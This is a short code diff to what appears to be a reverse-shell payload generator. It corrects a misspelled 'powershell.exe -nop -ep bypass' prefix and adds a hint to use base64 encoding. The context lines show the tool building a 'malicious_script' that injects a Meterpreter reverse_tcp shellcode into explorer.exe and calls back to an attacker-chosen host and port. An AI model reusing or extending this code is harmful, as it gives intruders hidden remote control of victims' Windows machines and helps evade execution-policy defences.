@@ -80,7 +80,7 @@ def base64_wrapper(name, code, args,shell="/bin/bash"):
             if "-Command" in code:
                 prefix, xcode = code.split("-Command")
             else:
-                prefix = "poweshell.exe -nop -ep bypass "
+                prefix = "powershell.exe -nop -ep bypass "
                 xcode = code
             
             pcode = xcode.replace("'", "") # Remove single quotes from -Command
@@ -148,7 +148,7 @@ class ReverseShell(object):
                 malicious_script = str(WINDOWS_BLOODSEEKER_SCRIPT.decode("base64")).replace("SHELLCODEHERE", shellcode_to_ps1("windows/x64/meterpreter/reverse_tcp", self.args.host, self.args.port))
                 self.code = malicious_script.replace("PROCESSNAME", "explorer") # we want inject into explorer.exe
                 print(alert("Make sure you have a handler for windows/x64/meterpreter/reverse_tcp listening in your machine."))
-
+                print(alert("It is recommended to use the --base64 flag."))
             else:
                 print(error("No custom shell procedure was arranged for this shell. This is fatal."))
                 exit(1)
